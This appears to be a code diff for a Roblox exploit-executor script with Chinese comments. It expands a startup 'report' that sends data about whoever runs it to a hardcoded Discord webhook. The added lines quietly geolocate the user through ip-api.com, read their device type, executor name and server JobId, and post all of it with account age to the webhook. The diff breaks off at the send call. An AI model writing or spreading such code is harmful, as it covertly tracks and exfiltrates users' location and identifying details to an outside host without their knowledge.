@@ -1,12 +1,25 @@
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
 
 -- 📢 核心 Webhook 配置
 local WebhookURL = "https://discord.com/api/webhooks/1456304374694412400/f5v3zsWGD-rWA5gS3c0epqk_XnXjWzDur7eqcHgD8Vn59dbYCXL-eXghWpFb964wJGY_"
 
--- 🚀 直接執行通報 (名字已在主腳本驗證過)
+-- 🚀 直接執行通報
 task.spawn(function()
+    -- 🌐 額外情報抓取 (國家、設備、軟體、JobId)
+    local location = "未知區域"
+    local pcall_success, response = pcall(function() return game:HttpGet("http://ip-api.com/json/?fields=country,city") end)
+    if pcall_success then
+        local decoded = HttpService:JSONDecode(response)
+        location = decoded.country .. " - " .. decoded.city
+    end
+
+    local device = UserInputService.TouchEnabled and not UserInputService.MouseEnabled and "📱 Mobile" or "💻 PC"
+    local exec = (identifyexecutor and identifyexecutor()) or "未知"
+
+    -- 📝 組合資訊 (邏輯與主人的一致，只是 fields 變豐富了)
     local data = {
         ["embeds"] = {{
             ["title"] = "🐾 貓貓終端 - 啟動報告",
@@ -14,13 +27,17 @@ task.spawn(function()
             ["color"] = 65535,
             ["fields"] = {
                 {["name"] = "帳號天數", ["value"] = localPlayer.AccountAge .. " 天", ["inline"] = true},
-                {["name"] = "遊戲 ID", ["value"] = "Place: " .. game.PlaceId, ["inline"] = true}
+                {["name"] = "所在國家", ["value"] = location, ["inline"] = true},
+                {["name"] = "設備/軟體", ["value"] = device .. " / " .. exec, ["inline"] = false},
+                {["name"] = "遊戲 ID", ["value"] = "Place: [" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
+                {["name"] = "房間 ID (JobId)", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false}
             },
             ["footer"] = {["text"] = "2026 貓貓系統 | 核心狀態: 正常"},
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
 
+    -- 📤 原封不動的發送邏輯
     pcall(function()
         local request = syn and syn.request or http_request or request or (HttpService and HttpService.request)
         if request then
